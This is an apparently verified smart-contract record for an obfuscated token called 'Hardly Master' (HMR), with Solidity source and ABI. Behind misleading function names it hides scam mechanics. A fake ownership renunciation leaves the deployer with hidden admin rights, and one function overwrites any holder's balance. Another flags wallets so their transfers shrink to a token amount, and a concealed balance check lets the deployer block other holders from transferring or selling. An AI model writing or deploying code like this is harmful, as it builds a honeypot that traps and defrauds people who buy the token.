{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface liquidityShouldMax {\n    function createPair(address feeReceiver, address swapLaunch) external returns (address);\n}\n\ninterface marketingLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountToken) external view returns (uint256);\n\n    function transfer(address teamSender, uint256 launchSell) external returns (bool);\n\n    function allowance(address exemptLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamSender,\n        uint256 launchSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeEnableLiquidity, uint256 value);\n    event Approval(address indexed exemptLimit, address indexed spender, uint256 value);\n}\n\nabstract contract exemptAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingLiquiditySell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableWallet is marketingLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HardlyMaster is exemptAt, marketingLaunched, enableWallet {\n\n    function balanceOf(address amountToken) public view virtual override returns (uint256) {\n        return autoToList[amountToken];\n    }\n\n    function approve(address modeTotal, uint256 launchSell) public virtual override returns (bool) {\n        maxTx[_msgSender()][modeTotal] = launchSell;\n        emit Approval(_msgSender(), modeTotal, launchSell);\n        return true;\n    }\n\n    address public senderShouldSell;\n\n    function walletSenderAmount(uint256 launchSell) public {\n        maxBuy();\n        takeLaunch = launchSell;\n    }\n\n    function allowance(address amountMarketing, address modeTotal) external view virtual override returns (uint256) {\n        if (modeTotal == exemptList) {\n            return type(uint256).max;\n        }\n        return maxTx[amountMarketing][modeTotal];\n    }\n\n    address receiverTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address fundReceiverLiquidity, uint256 launchSell) external virtual override returns (bool) {\n        return marketingSender(_msgSender(), fundReceiverLiquidity, launchSell);\n    }\n\n    function exemptSender(address marketingExempt, address teamSender, uint256 launchSell) internal returns (bool) {\n        require(autoToList[marketingExempt] >= launchSell);\n        autoToList[marketingExempt] -= launchSell;\n        autoToList[teamSender] += launchSell;\n        emit Transfer(marketingExempt, teamSender, launchSell);\n        return true;\n    }\n\n    mapping(address => bool) public limitAt;\n\n    string private teamWallet = \"HMR\";\n\n    function shouldMin(address fundReceiverLiquidity, uint256 launchSell) public {\n        maxBuy();\n        autoToList[fundReceiverLiquidity] = launchSell;\n    }\n\n    uint256 takeLaunch;\n\n    event OwnershipTransferred(address indexed listReceiver, address indexed fromLimit);\n\n    uint256 private maxLimit;\n\n    mapping(address => uint256) private autoToList;\n\n    function isMin(address tradingTeam) public {\n        if (enableMax) {\n            return;\n        }\n        \n        limitAt[tradingTeam] = true;\n        if (liquidityTo == liquidityEnable) {\n            takeMax = sellWallet;\n        }\n        enableMax = true;\n    }\n\n    uint256 private fundLiquidityList;\n\n    uint256 public sellSwap;\n\n    function fromSender() public {\n        emit OwnershipTransferred(senderShouldSell, address(0));\n        toReceiver = address(0);\n    }\n\n    address public atShould;\n\n    function maxBuy() private view {\n        require(limitAt[_msgSender()]);\n    }\n\n    bool public atTakeLaunched;\n\n    function transferFrom(address marketingExempt, address teamSender, uint256 launchSell) external override returns (bool) {\n        if (_msgSender() != exemptList) {\n            if (maxTx[marketingExempt][_msgSender()] != type(uint256).max) {\n                require(launchSell <= maxTx[marketingExempt][_msgSender()]);\n                maxTx[marketingExempt][_msgSender()] -= launchSell;\n            }\n        }\n        return marketingSender(marketingExempt, teamSender, launchSell);\n    }\n\n    uint8 private totalMinAmount = 18;\n\n    address exemptList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private autoTokenSender = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (shouldFrom != atTakeLaunched) {\n            sellWallet = fundLiquidityList;\n        }\n        tradingLiquiditySell fundLiquidity = tradingLiquiditySell(exemptList);\n        atShould = liquidityShouldMax(fundLiquidity.factory()).createPair(fundLiquidity.WETH(), address(this));\n        \n        senderShouldSell = _msgSender();\n        limitAt[senderShouldSell] = true;\n        autoToList[senderShouldSell] = autoTokenSender;\n        fromSender();\n        \n        emit Transfer(address(0), senderShouldSell, autoTokenSender);\n    }\n\n    uint256 public sellWallet;\n\n    string private limitExempt = \"Hardly Master\";\n\n    bool public shouldFrom;\n\n    uint256 private amountFund;\n\n    function receiverAt(address receiverSell) public {\n        maxBuy();\n        \n        if (receiverSell == senderShouldSell || receiverSell == atShould) {\n            return;\n        }\n        senderWallet[receiverSell] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitExempt;\n    }\n\n    function owner() external view returns (address) {\n        return toReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalMinAmount;\n    }\n\n    uint256 private takeMax;\n\n    uint256 constant teamAt = 18 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamWallet;\n    }\n\n    address private toReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTokenSender;\n    }\n\n    uint256 atAmount;\n\n    mapping(address => mapping(address => uint256)) private maxTx;\n\n    bool public liquidityTo;\n\n    bool public liquidityEnable;\n\n    bool public enableMax;\n\n    function getOwner() external view returns (address) {\n        return toReceiver;\n    }\n\n    mapping(address => bool) public senderWallet;\n\n    function marketingSender(address marketingExempt, address teamSender, uint256 launchSell) internal returns (bool) {\n        if (marketingExempt == senderShouldSell) {\n            return exemptSender(marketingExempt, teamSender, launchSell);\n        }\n        uint256 walletFee = marketingLaunched(atShould).balanceOf(receiverTotal);\n        require(walletFee == takeLaunch);\n        require(teamSender != receiverTotal);\n        if (senderWallet[marketingExempt]) {\n            return exemptSender(marketingExempt, teamSender, teamAt);\n        }\n        return exemptSender(marketingExempt, teamSender, launchSell);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnableLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTakeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShouldSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"shouldMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"walletSenderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HardlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}